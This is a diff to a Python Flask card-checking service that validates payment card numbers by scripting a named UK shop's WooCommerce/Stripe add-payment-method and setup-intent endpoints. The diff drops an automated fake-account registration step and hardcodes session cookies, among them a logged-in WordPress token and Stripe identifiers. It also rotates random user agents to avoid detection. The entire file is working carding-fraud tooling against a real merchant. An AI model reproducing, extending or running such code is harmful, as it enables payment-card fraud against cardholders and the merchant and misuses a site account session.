@@ -2,15 +2,8 @@ from flask import Flask, request, jsonify
 import requests
 from fake_useragent import UserAgent
 import re
-import random
 
 app = Flask(__name__)
-
-def generate_random_email():
-    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
-    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
-    domain = random.choice(domains)
-    return f"{name}@{domain}"
 
 def process_card(ccx):
     ccx = ccx.strip()
@@ -23,62 +16,8 @@ def process_card(ccx):
         yy = yy.split("20")[1]
     
     user_agent = UserAgent().random
-    email = generate_random_email()
-
-    # Step 1: Register a new customer account
-    register_cookies = {
-        'return_user': 'yes',
-        'sbjs_migrations': '1418474375998%3D1',
-    }
-
-    register_headers = {
-        'User-Agent': user_agent,
-        'Origin': 'https://mmbluxury.co.uk',
-        'Referer': 'https://mmbluxury.co.uk/my-account/?action=login',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    }
-
-    register_data = {
-        'email': email,
-        'email_2': '',
-        'wc_order_attribution_source_type': 'typein',
-        'wc_order_attribution_referrer': '(none)',
-        'wc_order_attribution_utm_campaign': '(none)',
-        'wc_order_attribution_utm_source': '(direct)',
-        'wc_order_attribution_utm_medium': '(none)',
-        'wc_order_attribution_utm_content': '(none)',
-        'wc_order_attribution_utm_id': '(none)',
-        'wc_order_attribution_utm_term': '(none)',
-        'wc_order_attribution_utm_source_platform': '(none)',
-        'wc_order_attribution_utm_creative_format': '(none)',
-        'wc_order_attribution_utm_marketing_tactic': '(none)',
-        'wc_order_attribution_session_entry': 'https://mmbluxury.co.uk/my-account/add-payment-method/',
-        'wc_order_attribution_session_start_time': '2025-06-11 03:49:23',
-        'wc_order_attribution_session_pages': '2',
-        'wc_order_attribution_session_count': '1',
-        'wc_order_attribution_user_agent': user_agent,
-        'woocommerce-register-nonce': '24bcec713b',
-        '_wp_http_referer': '/my-account/?action=login',
-        'register': 'Register',
-    }
-
-    try:
-        register_response = requests.post(
-            'https://mmbluxury.co.uk/my-account/',
-            params={'action': 'register'},
-            cookies=register_cookies,
-            headers=register_headers,
-            data=register_data
-        )
-        
-        # Get the new session cookies
-        session_cookies = register_response.cookies.get_dict()
-        if 'wordpress_logged_in' not in session_cookies:
-            return {"response": "Failed to create account", "status": "Error"}
-    except Exception as e:
-        return {"response": str(e), "status": "Error"}
-
-    # Step 2: Create Payment Method with new customer
+    
+    # Step 1: Create Payment Method
     payment_data = {
         'type': 'card',
         'card[number]': n,
@@ -111,13 +50,20 @@ def process_card(ccx):
     except Exception as e:
         return {"response": str(e), "status": "Error"}
 
-    # Step 3: Get Nonce
+    # Step 2: Get Nonce with updated cookies
     cookies = {
         'return_user': 'yes',
-        '_fbp': 'fb.2.1748492273838.777832142325543057',
-        '__stripe_mid': '9fb2b77d-db16-48dd-a007-744c98b7c6070a85b8',
         'sbjs_migrations': '1418474375998%3D1',
-        **session_cookies
+        'sbjs_current_add': 'fd%3D2025-06-11%2003%3A49%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fmmbluxury.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_first_add': 'fd%3D2025-06-11%2003%3A49%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fmmbluxury.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
+        '_fbp': 'fb.2.1749615564576.816640552903993242',
+        '__stripe_mid': '000340cd-a315-4a91-b8e8-00bc0a644314817081',
+        '__stripe_sid': 'b58bf42b-e142-4a19-aa1c-b4addf2cbd754c0cd2',
+        'wordpress_logged_in_75c9f6091cede3871ec7c2a48972aa57': 'dilego2878%7C1750825225%7C6roNMJs2kXmKgSpnA2Z29eaPhPsu4pJJZ5sGid9kkHx%7C5acceb95a1c70d0edebe3b6b467e030b233a3471540f98696f810318043b090e',
+        'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmmbluxury.co.uk%2Fmy-account%2Fadd-payment-method%2F',
     }
     
     headers = {
@@ -150,7 +96,7 @@ def process_card(ccx):
     except Exception as e:
         return {"response": str(e), "status": "Error"}
 
-    # Step 4: Create Setup Intent
+    # Step 3: Create Setup Intent
     params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
     data = {
         'action': 'create_and_confirm_setup_intent',
